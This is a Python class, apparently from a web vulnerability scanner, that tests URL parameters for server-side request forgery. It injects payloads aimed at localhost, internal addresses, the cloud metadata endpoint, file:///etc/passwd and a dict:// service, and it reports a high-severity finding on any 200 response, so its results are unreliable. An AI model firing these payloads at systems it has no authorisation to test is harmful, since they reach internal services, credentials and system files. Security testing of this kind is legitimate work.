from typing import Dict, List
from core.request_handler import RequestHandler

class SSRFScanner:
    def __init__(self):
        self.request_handler = RequestHandler()
    
    def scan(self, url: str, parameters: Dict = None) -> List[Dict]:
        vulnerabilities = []
        if not parameters:
            parameters = {'url': '', 'file': '', 'fetch': ''}
        payloads = [
            "http://localhost",
            "http://127.0.0.1",
            "http://169.254.169.254",
            "http://0.0.0.0",
            "http://[::1]",
            "http://localhost:8080",
            "http://127.0.0.1:22",
            "http://192.168.1.1",
            "file:///etc/passwd",
            "dict://localhost:11211"
        ]
        for param_name in parameters.keys():
            for payload in payloads:
                test_params = parameters.copy()
                test_params[param_name] = payload
                response = self.request_handler.send_request(url, data=test_params)
                if response.get('status_code') == 200:
                    vulnerabilities.append({
                        'type': 'SSRF',
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        'severity': 'High',
                        'description': 'SSRF vulnerability detected',
                        'evidence': f'Successfully accessed: {payload}'
                    })
        return vulnerabilities